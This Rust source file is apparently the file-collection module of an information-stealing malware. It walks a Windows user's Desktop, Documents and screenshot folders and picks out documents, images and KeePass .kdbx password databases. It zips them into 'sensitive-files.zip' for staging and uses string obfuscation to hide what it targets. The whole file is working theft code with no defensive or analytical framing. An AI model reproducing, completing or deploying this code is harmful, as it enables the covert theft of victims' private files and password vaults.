use crate::File;
use image::codecs::jpeg::JpegEncoder;
use std::fs;
use std::io::Cursor;
use std::io::*;
use walkdir::WalkDir;
use zip::write::*;

pub fn grab_data(path_in: String) -> Option<String> {
    let filename = format!(
        "{}\\{}",
        std::env::temp_dir().to_string_lossy(),
        obfstr::obfstr!("sensitive-files.zip")
    );
    let path = std::path::Path::new(&filename);

    let file = fs::File::create(path);

    if file.is_err() {
        return None;
    }

    let file = file.unwrap();

    let mut zip_writer = zip::ZipWriter::new(file);
    let options = FileOptions::default().compression_method(zip::CompressionMethod::Deflated);

    let home_dir = std::env::var(obfstr::obfstr!("USERPROFILE")).unwrap();
    let paths = vec![
        format!("{}\\{}", home_dir, obfstr::obfstr!("Desktop\\")),
        format!("{}\\{}", home_dir, obfstr::obfstr!("Documents\\")),
        format!("{}\\{}", home_dir, obfstr::obfstr!("Videos\\Captures\\")),
        format!(
            "{}\\{}",
            home_dir,
            obfstr::obfstr!("Pictures\\Screenshots\\")
        ),
        format!(
            "{}\\{}",
            home_dir,
            obfstr::obfstr!("AppData\\Roaming\\.minecraft\\screenshots\\")
        ),
    ];

    let valid_extensions: Vec<String> = vec![
        obfstr::obfstr!(".txt").to_string(),
        obfstr::obfstr!(".kdbx").to_string(),
        obfstr::obfstr!(".pdf").to_string(),
        obfstr::obfstr!(".doc").to_string(),
        obfstr::obfstr!(".docx").to_string(),
        obfstr::obfstr!(".xls").to_string(),
        obfstr::obfstr!(".xlsx").to_string(),
        obfstr::obfstr!(".ppt").to_string(),
        obfstr::obfstr!(".pptx").to_string(),
        obfstr::obfstr!(".odt").to_string(),
        obfstr::obfstr!(".odp").to_string(),
        obfstr::obfstr!(".png").to_string(),
        obfstr::obfstr!(".jpg").to_string(),
    ];

    for path in paths {
        if std::path::Path::new(&path).exists() {
            for entry in WalkDir::new(&path)
                .max_depth(1)
                .into_iter()
                .filter_map(|f| f.ok())
            {
                if let Ok(f) = &mut File::open(entry.path()) {
                    let mut buffer: Vec<u8> = match &f.metadata() {
                        Ok(metadata) => Vec::with_capacity(metadata.len() as usize),
                        Err(_) => Vec::new(),
                    };

                    if !valid_extensions
                        .iter()
                        .any(|suffix| entry.file_name().to_str().unwrap().ends_with(suffix))
                    {
                        continue;
                    }

                    if buffer.capacity() >= 2500000 {
                        continue;
                    }

                    unsafe { crate::FILES += 1 };

                    if f.read_to_end(&mut buffer).is_ok() {
                        // Check if the file is an image
                        if let Ok(img) = image::load_from_memory(&buffer) {
                            // Compress the image
                            let mut compressed_buffer = Cursor::new(Vec::new());
                            let mut encoder =
                                JpegEncoder::new_with_quality(&mut compressed_buffer, 30);
                            let _ = encoder.encode(
                                &img.clone().into_bytes(),
                                img.width(),
                                img.height(),
                                img.color().into(),
                            );
                            buffer = compressed_buffer.into_inner();
                        }

                        if zip_writer
                            .start_file(entry.file_name().to_str().unwrap(), options)
                            .is_ok()
                        {
                            let _ = zip_writer.write_all(&buffer);
                        }
                    }
                }
            }
        }
    }

    zip_writer.finish().ok()?;

    if unsafe { crate::FILES } > 0 {

        if std::fs::metadata(&filename).is_ok() {
            let size = std::fs::metadata(&filename).unwrap();
            if size.len() >= 30_000_000 {
                return Some(String::new()); // File too big
            }
        }


        let _ = fs::copy(
            filename,
            format!("{}/{}", path_in, obfstr::obfstr!("sensitive-files.zip")),
        );
    }
    Some(String::new())
}
